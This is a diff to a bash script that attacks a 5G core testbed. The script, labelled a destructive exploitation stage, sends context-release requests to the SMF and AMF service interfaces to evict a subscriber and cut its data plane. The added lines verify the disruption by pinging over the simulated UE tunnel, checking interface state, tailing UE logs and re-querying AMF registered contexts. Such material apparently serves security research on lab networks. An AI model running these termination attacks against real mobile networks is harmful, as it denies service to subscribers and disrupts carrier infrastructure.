@@ -4,6 +4,8 @@ set -e
 AMF_SBI="http://10.0.0.18:8000"
 NRF_SBI="http://10.0.0.10:8000"
 SMF_SBI="http://10.0.0.2:8000"
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+UE_LOG="$SCRIPT_DIR/ue.log"
 
 CYAN='\033[0;36m'
 GREEN='\033[0;32m'
@@ -33,6 +35,7 @@ echo -e "======================================================================$
 echo "AMF Target: $AMF_SBI"
 echo "NRF Target: $NRF_SBI"
 echo "SMF Target: $SMF_SBI"
+echo "UE Log Path: $UE_LOG"
 echo ""
 
 # --------------------------------------------------------------------------
@@ -191,7 +194,7 @@ fi
 echo ""
 
 # ==========================================================================
-# DESTRUCTIVE EXPLOITATION STAGE (TERMINATION ATTACKS)
+# DESTRUCTIVE EXPLOITATION STAGE (TERMINATION ATTACKS WITH VERIFICATION)
 # ==========================================================================
 echo -e "${RED}======================================================================"
 echo "                   DESTRUCTIVE EXPLOITATION PHASE                     "
@@ -223,10 +226,27 @@ if [ -n "$SM_REF" ]; then
         echo -e "${BOLD}[+] SMF Response:${NC} HTTP $HTTP_CODE"
         if [ "$HTTP_CODE" -eq 200 ] || [ "$HTTP_CODE" -eq 204 ]; then
             echo -e "${GREEN}[+] SUCCESS: SMF released user-plane context.${NC}"
-            echo -e "[*] Verifying data-plane disruption..."
-            if ! ping -c 3 -W 1 -I uesimtun0 8.8.8.8 >/dev/null 2>&1; then
-                echo -e "${GREEN}[CONFIRMED] uesimtun0 traffic dropped (100% loss).${NC}"
-            fi
+        fi
+        
+        # ------------------------------------------------------------------
+        # STEP 7 VERIFICATION: Data Plane Ping & Interface Inspection
+        # ------------------------------------------------------------------
+        echo ""
+        echo -e "${YELLOW}>>> [VERIFYING IMPACT ON UERANSIM (Step 7)] <<<${NC}"
+        echo -e "${BOLD}1. Checking Data-Plane Disruption:${NC}"
+        echo "Command: ping -c 3 -W 1 -I uesimtun0 8.8.8.8"
+        if ! ping -c 3 -W 1 -I uesimtun0 8.8.8.8 >/dev/null 2>&1; then
+            echo -e "   ${GREEN}[CONFIRMED] Traffic through uesimtun0 dropped! 100% packet loss.${NC}"
+        else
+            echo -e "   ${RED}[!] Traffic is still passing. Check SMF/UPF association.${NC}"
+        fi
+
+        echo -e "\n${BOLD}2. Checking uesimtun0 status:${NC}"
+        ip addr show dev uesimtun0 2>/dev/null || echo -e "   ${GREEN}uesimtun0 interface has been removed.${NC}"
+
+        echo -e "\n${BOLD}3. Inspecting latest UERANSIM UE log entries:${NC}"
+        if [ -f "$UE_LOG" ]; then
+            tail -n 8 "$UE_LOG"
         fi
         echo ""
     fi
@@ -256,7 +276,37 @@ if [ -n "$TARGET_SUPI" ]; then
 
         echo -e "${BOLD}[+] AMF Response:${NC} HTTP $HTTP_COMM_CODE"
         if [ "$HTTP_COMM_CODE" -eq 200 ] || [ "$HTTP_COMM_CODE" -eq 204 ]; then
-            echo -e "${GREEN}[+] SUCCESS: AMF released subscriber $TARGET_SUPI.${NC}"
+            echo -e "${GREEN}[+] SUCCESS: AMF accepted context release for $TARGET_SUPI.${NC}"
+        fi
+
+        # ------------------------------------------------------------------
+        # STEP 8 VERIFICATION: UE Interface, State, and Logs
+        # ------------------------------------------------------------------
+        echo ""
+        echo -e "${YELLOW}>>> [VERIFYING IMPACT ON UERANSIM (Step 8)] <<<${NC}"
+        sleep 1
+
+        echo -e "${BOLD}1. Checking TUN Interface (uesimtun0) Status:${NC}"
+        if ip addr show dev uesimtun0 >/dev/null 2>&1; then
+            IF_STATE=$(ip -o link show dev uesimtun0 | awk '{print $9}')
+            echo -e "   Interface State: ${YELLOW}$IF_STATE${NC}"
+        else
+            echo -e "   ${GREEN}[CONFIRMED] uesimtun0 has been destroyed by the UE process.${NC}"
+        fi
+
+        echo -e "\n${BOLD}2. Inspecting UERANSIM UE Log (Disconnect & Deregistration Signatures):${NC}"
+        if [ -f "$UE_LOG" ]; then
+            tail -n 12 "$UE_LOG"
+        else
+            echo "   [!] ue.log not found at $UE_LOG"
+        fi
+
+        echo -e "\n${BOLD}3. Confirming Subscriber Context Eviction from AMF:${NC}"
+        RECHECK=$(curl -s "$AMF_SBI/namf-oam/v1/registered-ue-context" || true)
+        if [[ "$RECHECK" == "null" || "$RECHECK" == "[]" || -z "$RECHECK" ]]; then
+            echo -e "   ${GREEN}[CONFIRMED] AMF registered-ue-context is now EMPTY (UE completely deregistered).${NC}"
+        else
+            echo -e "   Active contexts remaining in AMF: $(echo "$RECHECK" | jq -c .)"
         fi
         echo ""
     fi
